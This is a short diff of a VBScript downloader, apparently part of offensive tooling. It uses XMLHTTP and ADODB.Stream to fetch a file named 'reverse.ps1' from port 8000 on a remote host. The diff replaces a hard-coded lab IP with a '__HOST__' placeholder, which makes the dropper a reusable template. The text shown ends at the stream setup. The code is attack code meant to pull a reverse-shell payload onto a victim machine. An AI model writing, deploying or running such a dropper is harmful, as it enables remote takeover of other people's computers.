@@ -1,6 +1,6 @@
 Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
 Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
-xHttp.Open "GET", "http://10.13.37.1:8000/reverse.ps1", False
+xHttp.Open "GET", "http://__HOST__:8000/reverse.ps1", False
 xHttp.Send
 bStrm.Type = 1
 bStrm.Open
